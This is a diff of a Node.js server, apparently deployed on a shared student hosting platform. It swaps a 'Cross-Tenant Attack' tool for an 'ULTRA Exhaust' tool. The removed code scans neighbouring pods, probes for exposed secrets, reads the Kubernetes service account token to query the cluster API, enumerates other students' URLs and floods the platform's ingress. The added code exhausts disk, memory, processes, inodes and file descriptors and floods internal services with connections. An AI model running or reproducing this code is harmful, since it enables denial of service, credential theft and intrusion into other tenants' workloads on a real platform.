@@ -1,285 +1,212 @@
 const http = require("http");
-const https = require("https");
-const net = require("net");
-const os = require("os");
-const dns = require("dns");
 const fs = require("fs");
+const os = require("os");
 const crypto = require("crypto");
+const { execSync, spawn } = require("child_process");
+const net = require("net");
 
 let results = {};
 
-// Scan for other student pods
-async function scanPodNetwork() {
-  results.podNetwork = { myIP: "", discovered: [], probed: [] };
+// ULTRA DISK - Write 5GB
+async function ultraDisk() {
+  results.ultraDisk = { mb: 0 };
+  const chunk = crypto.randomBytes(100 * 1024 * 1024); // 100MB
   
-  const myIP = Object.values(os.networkInterfaces())
-    .flat()
-    .find(i => i.family === "IPv4" && !i.internal)?.address;
-  
-  results.podNetwork.myIP = myIP;
-  
-  if (!myIP) return;
-  
-  const [b1, b2, b3] = myIP.split(".").map(Number);
-  
-  // Scan same /16 network aggressively
-  const ipsToScan = [];
-  
-  // Same /24
-  for (let h = 1; h <= 254; h++) {
-    if (`${b1}.${b2}.${b3}.${h}` !== myIP) {
-      ipsToScan.push(`${b1}.${b2}.${b3}.${h}`);
+  for (let i = 0; i < 50; i++) {
+    try {
+      fs.writeFileSync(`/tmp/ultra_${i}`, chunk);
+      results.ultraDisk.mb += 100;
+    } catch(e) {
+      results.ultraDisk.error = e.message;
+      results.ultraDisk.stoppedAt = results.ultraDisk.mb + "MB";
+      break;
     }
   }
   
-  // Adjacent /24s
-  for (let offset = -5; offset <= 5; offset++) {
-    const subnet = b3 + offset;
-    if (subnet >= 0 && subnet <= 255 && subnet !== b3) {
-      for (let h = 1; h <= 30; h++) {
-        ipsToScan.push(`${b1}.${b2}.${subnet}.${h}`);
-      }
-    }
-  }
-  
-  // Common pod ports
-  const ports = [3000, 8080, 80, 5000, 4000, 8000];
-  
-  for (const ip of ipsToScan) {
-    for (const port of ports) {
-      const socket = new net.Socket();
-      socket.setTimeout(30);
-      
-      const open = await new Promise(r => {
-        socket.on("connect", () => { socket.destroy(); r(true); });
-        socket.on("error", () => r(false));
-        socket.on("timeout", () => { socket.destroy(); r(false); });
-        socket.connect(port, ip);
-      });
-      
-      if (open) {
-        results.podNetwork.discovered.push({ ip, port });
-        
-        // Probe HTTP
-        try {
-          const response = await new Promise((resolve, reject) => {
-            const req = http.get(`http://${ip}:${port}/`, { timeout: 2000 }, res => {
-              let body = "";
-              res.on("data", c => body += c);
-              res.on("end", () => resolve({ 
-                status: res.statusCode, 
-                headers: Object.fromEntries(
-                  Object.entries(res.headers).filter(([k]) => ["server","x-powered-by","content-type"].includes(k))
-                ),
-                body: body.substring(0, 300)
-              }));
-            });
-            req.on("error", reject);
-            req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
-          });
-          
-          results.podNetwork.probed.push({ ip, port, ...response });
-          
-          // Try to exploit
-          if (response.status === 200) {
-            // Try /env endpoint
-            try {
-              const envResp = await httpGet(`http://${ip}:${port}/env`, 1000);
-              if (envResp && envResp.includes("SECRET")) {
-                results.podNetwork.probed[results.podNetwork.probed.length - 1].exposedSecrets = true;
-              }
-            } catch(e) {}
-            
-            // Try /debug endpoint
-            try {
-              const debugResp = await httpGet(`http://${ip}:${port}/debug`, 1000);
-              if (debugResp) {
-                results.podNetwork.probed[results.podNetwork.probed.length - 1].debugEndpoint = debugResp.substring(0, 200);
-              }
-            } catch(e) {}
-          }
-        } catch(e) {}
-      }
-    }
+  // Cleanup
+  for (let i = 0; i < 50; i++) {
+    try { fs.unlinkSync(`/tmp/ultra_${i}`); } catch(e) {}
   }
 }
 
-// Discover K8s services via DNS
-async function discoverServices() {
-  results.k8sServices = { resolved: [], internal: [] };
+// ULTRA MEMORY - Allocate until OOM
+async function ultraMemory() {
+  results.ultraMemory = { mb: 0 };
+  const chunks = [];
   
-  // Common K8s service names
-  const services = [
-    "kuros-api", "kuros-backend", "kuros-frontend", "kuros-db",
-    "mongo", "mongodb", "postgres", "postgresql", "mysql", "redis",
-    "api", "backend", "frontend", "web", "app", "nginx",
-    "kubernetes", "kube-dns", "metrics-server"
-  ];
-  
-  const namespaces = ["default", "kube-system", "kuros", "production", "staging"];
-  
-  for (const ns of namespaces) {
-    for (const svc of services) {
-      const fqdn = `${svc}.${ns}.svc.cluster.local`;
-      try {
-        const addrs = await new Promise((r, j) => {
-          dns.resolve4(fqdn, (e, a) => e ? j(e) : r(a));
-        });
-        results.k8sServices.resolved.push({ name: fqdn, ips: addrs });
-        
-        // Try to connect
-        for (const ip of addrs) {
-          for (const port of [80, 443, 3000, 5432, 6379, 27017]) {
-            const socket = new net.Socket();
-            socket.setTimeout(100);
-            
-            const open = await new Promise(r => {
-              socket.on("connect", () => { socket.destroy(); r(true); });
-              socket.on("error", () => r(false));
-              socket.on("timeout", () => { socket.destroy(); r(false); });
-              socket.connect(port, ip);
-            });
-            
-            if (open) {
-              results.k8sServices.internal.push({ service: fqdn, ip, port });
-            }
-          }
-        }
-      } catch(e) {}
-    }
-  }
-}
-
-// Try to access other student URLs directly
-async function probeStudentURLs() {
-  results.studentURLs = { probed: [], accessible: [] };
-  
-  // Generate potential student app URLs
-  const patterns = [
-    "test-student", "demo-student", "app-student", "web-student",
-    "api-student", "hello-student", "project-student", "sample-student"
-  ];
-  
-  // Common user ID patterns (hexadecimal)
-  const userIdPrefixes = ["6ab", "6ac", "6ad", "6ae", "6af", "6b0"];
-  
-  for (const pattern of patterns) {
-    for (const prefix of userIdPrefixes) {
-      for (let i = 0; i < 16; i++) {
-        const hex = i.toString(16);
-        const userId = `${prefix}a${hex}000000000000000000000000`.substring(0, 24);
-        const url = `https://${pattern}-${userId}.kuros.cryboy.in`;
-        
-        try {
-          const resp = await new Promise((resolve, reject) => {
-            https.get(url, { timeout: 3000, rejectUnauthorized: false }, res => {
-              let body = "";
-              res.on("data", c => body += c);
-              res.on("end", () => resolve({ url, status: res.statusCode, body: body.substring(0, 200) }));
-            }).on("error", reject);
-          });
-          
-          results.studentURLs.probed.push({ url, status: resp.status });
-          
-          if (resp.status === 200 || resp.status === 302 || resp.status === 401) {
-            results.studentURLs.accessible.push(resp);
-          }
-        } catch(e) {}
-      }
-    }
-  }
-}
-
-// Try to access shared resources
-async function probeSharedResources() {
-  results.sharedResources = {};
-  
-  // Try to access K8s API
   try {
-    const token = fs.readFileSync("/var/run/secrets/kubernetes.io/serviceaccount/token", "utf8");
-    results.sharedResources.k8sToken = { found: true, length: token.length };
-    
-    // Try to list pods
-    const resp = await new Promise((resolve, reject) => {
-      https.get("https://kubernetes.default.svc/api/v1/pods", {
-        headers: { "Authorization": `Bearer ${token}` },
-        rejectUnauthorized: false,
-        timeout: 5000
-      }, res => {
-        let body = "";
-        res.on("data", c => body += c);
-        res.on("end", () => resolve({ status: res.statusCode, body }));
-      }).on("error", reject);
-    });
-    
-    results.sharedResources.k8sApiAccess = {
-      status: resp.status,
-      response: resp.body.substring(0, 500)
-    };
-  } catch(e) {
-    results.sharedResources.k8sToken = { error: e.message };
-  }
-}
-
-// DDoS attack on ingress
-async function ddosIngress() {
-  results.ingressDDoS = { requests: 0, errors: 0 };
-  
-  const concurrency = 50;
-  const total = 500;
-  
-  for (let batch = 0; batch < total / concurrency; batch++) {
-    const promises = [];
-    for (let i = 0; i < concurrency; i++) {
-      promises.push(new Promise(resolve => {
-        https.get("https://kuros.cryboy.in/", {
-          timeout: 5000,
-          rejectUnauthorized: false
-        }, res => {
-          results.ingressDDoS.requests++;
-          res.on("data", () => {});
-          res.on("end", resolve);
-        }).on("error", () => {
-          results.ingressDDoS.errors++;
-          resolve();
-        });
-      }));
+    while (true) {
+      const chunk = Buffer.alloc(100 * 1024 * 1024); // 100MB
+      chunk.fill(crypto.randomBytes(1)[0]);
+      chunks.push(chunk);
+      results.ultraMemory.mb += 100;
+      
+      // Will eventually OOM
+      if (os.freemem() < 10 * 1024 * 1024) break;
     }
-    await Promise.all(promises);
+  } catch(e) {
+    results.ultraMemory.crashed = true;
+    results.ultraMemory.error = e.message;
   }
 }
 
-async function httpGet(url, timeout = 2000) {
-  return new Promise((resolve, reject) => {
-    const proto = url.startsWith("https") ? https : http;
-    const req = proto.get(url, { timeout, rejectUnauthorized: false }, res => {
-      let body = "";
-      res.on("data", c => body += c);
-      res.on("end", () => resolve(body));
-    });
-    req.on("error", reject);
-    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
-  });
+// ULTRA PROCESS - Fork 1000 processes
+async function ultraProcess() {
+  results.ultraProcess = { spawned: 0 };
+  const children = [];
+  
+  try {
+    for (let i = 0; i < 1000; i++) {
+      const child = spawn("sleep", ["60"], { detached: true, stdio: "ignore" });
+      child.unref();
+      children.push(child);
+      results.ultraProcess.spawned++;
+    }
+  } catch(e) {
+    results.ultraProcess.error = e.message;
+  }
+  
+  // Cleanup after 5s
+  setTimeout(() => {
+    children.forEach(c => { try { c.kill(); } catch(e) {} });
+  }, 5000);
+}
+
+// ULTRA INODE - Create 500K files
+async function ultraInode() {
+  results.ultraInode = { created: 0 };
+  const dir = `/tmp/inode_${Date.now()}`;
+  try { fs.mkdirSync(dir); } catch(e) {}
+  
+  for (let i = 0; i < 500000; i++) {
+    try {
+      fs.writeFileSync(`${dir}/f${i}`, "x");
+      results.ultraInode.created++;
+    } catch(e) {
+      results.ultraInode.error = e.message;
+      break;
+    }
+  }
+  
+  // Cleanup
+  try { fs.rmSync(dir, { recursive: true, force: true }); } catch(e) {}
+}
+
+// ULTRA NETWORK - Open 10000 connections
+async function ultraNetwork() {
+  results.ultraNetwork = { connections: 0, bytes: 0 };
+  const sockets = [];
+  const payload = crypto.randomBytes(65536);
+  
+  for (let i = 0; i < 10000; i++) {
+    try {
+      const socket = new net.Socket();
+      socket.setTimeout(100);
+      
+      await new Promise(r => {
+        socket.on("connect", () => {
+          sockets.push(socket);
+          results.ultraNetwork.connections++;
+          
+          // Flood
+          for (let j = 0; j < 5; j++) {
+            try {
+              socket.write(payload);
+              results.ultraNetwork.bytes += payload.length;
+            } catch(e) {}
+          }
+          r();
+        });
+        socket.on("error", r);
+        socket.on("timeout", () => { socket.destroy(); r(); });
+        
+        // Randomly target internal services
+        const targets = [
+          { ip: "10.100.0.1", port: 443 },
+          { ip: "10.100.0.10", port: 53 },
+          { ip: "10.100.33.236", port: 443 }
+        ];
+        const t = targets[i % targets.length];
+        socket.connect(t.port, t.ip);
+      });
+    } catch(e) {
+      results.ultraNetwork.error = e.message;
+      break;
+    }
+  }
+  
+  results.ultraNetwork.totalMB = (results.ultraNetwork.bytes / (1024*1024)).toFixed(2);
+  
+  // Cleanup
+  sockets.forEach(s => { try { s.destroy(); } catch(e) {} });
+}
+
+// ULTRA FD - Open 100K file descriptors
+async function ultraFD() {
+  results.ultraFD = { opened: 0 };
+  const handles = [];
+  
+  try {
+    for (let i = 0; i < 100000; i++) {
+      handles.push(fs.openSync("/dev/null", "r"));
+      results.ultraFD.opened++;
+    }
+  } catch(e) {
+    results.ultraFD.error = e.message;
+    results.ultraFD.max = handles.length;
+  }
+  
+  // Cleanup
+  handles.forEach(fd => { try { fs.closeSync(fd); } catch(e) {} });
+}
+
+// Get full system info
+async function systemInfo() {
+  results.systemInfo = {
+    hostname: os.hostname(),
+    cpus: os.cpus().length,
+    totalMem: (os.totalmem() / (1024**3)).toFixed(2) + "GB",
+    freeMem: (os.freemem() / (1024**3)).toFixed(2) + "GB",
+    loadAvg: os.loadavg(),
+    uptime: os.uptime(),
+    platform: os.platform(),
+    release: os.release()
+  };
+  
+  // Try to get more info
+  try {
+    results.systemInfo.df = execSync("df -h /tmp 2>/dev/null || true", { timeout: 5000 }).toString().trim();
+  } catch(e) {}
+  
+  try {
+    results.systemInfo.ulimits = execSync("ulimit -a 2>/dev/null || true", { timeout: 5000 }).toString().trim();
+  } catch(e) {}
+  
+  try {
+    results.systemInfo.env = Object.keys(process.env).filter(k => 
+      !k.includes("SECRET") && !k.includes("PASSWORD") && !k.includes("KEY")
+    );
+  } catch(e) {}
 }
 
 const server = http.createServer(async (req, res) => {
-  results = { timestamp: new Date().toISOString(), hostname: os.hostname() };
+  results = { timestamp: new Date().toISOString() };
   
   try {
-    if (req.url === "/crosstenant") {
-      await scanPodNetwork();
-      await discoverServices();
-      await probeSharedResources();
-    } else if (req.url === "/pods") {
-      await scanPodNetwork();
-    } else if (req.url === "/services") {
-      await discoverServices();
-    } else if (req.url === "/students") {
-      await probeStudentURLs();
-    } else if (req.url === "/shared") {
-      await probeSharedResources();
-    } else if (req.url === "/ddos") {
-      await ddosIngress();
+    await systemInfo();
+    
+    if (req.url === "/disk") await ultraDisk();
+    else if (req.url === "/memory") await ultraMemory();
+    else if (req.url === "/process") await ultraProcess();
+    else if (req.url === "/inode") await ultraInode();
+    else if (req.url === "/network") await ultraNetwork();
+    else if (req.url === "/fd") await ultraFD();
+    else if (req.url === "/all") {
+      await ultraDisk();
+      await ultraProcess();
+      await ultraInode();
+      await ultraFD();
+      await ultraNetwork();
     }
     
     res.writeHead(200, { "Content-Type": "application/json" });
@@ -291,4 +218,4 @@ const server = http.createServer(async (req, res) => {
 });
 
 server.listen(process.env.PORT || 3000);
-console.log("Cross-Tenant Attack on port " + (process.env.PORT || 3000));
+console.log("ULTRA Exhaust on port " + (process.env.PORT || 3000));
